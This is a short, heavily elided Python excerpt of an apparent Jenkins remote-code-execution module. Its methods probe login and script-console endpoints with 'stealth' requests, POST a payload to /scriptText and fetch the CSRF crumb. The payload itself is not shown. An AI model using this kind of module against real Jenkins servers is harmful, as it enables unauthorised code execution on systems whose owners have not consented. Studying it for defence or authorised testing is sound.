...
class JenkinsRCEModule(BaseModule):
    ...
    def check_jenkins_endpoints(self, target, port, module_name):
        ...
        try:
            req = self.stealth_request(f"{base}/login")
        ...
        try:
            req = self.stealth_request(script_url)
            resp = opener.open(req, timeout=4)
    ...
    def validate_script_execution(self, base, opener, module_name):
        ...
        try:
            req = self.stealth_request(f"{base}/scriptText", data=payload, method="POST")
    ...
    def fetch_crumb(self, base, opener):
        ...
        try:
            req = self.stealth_request(f"{base}/crumbIssuer/api/json")
            resp = opener.open(req, timeout=4)
            if resp.getcode() != 200:
                return None, None
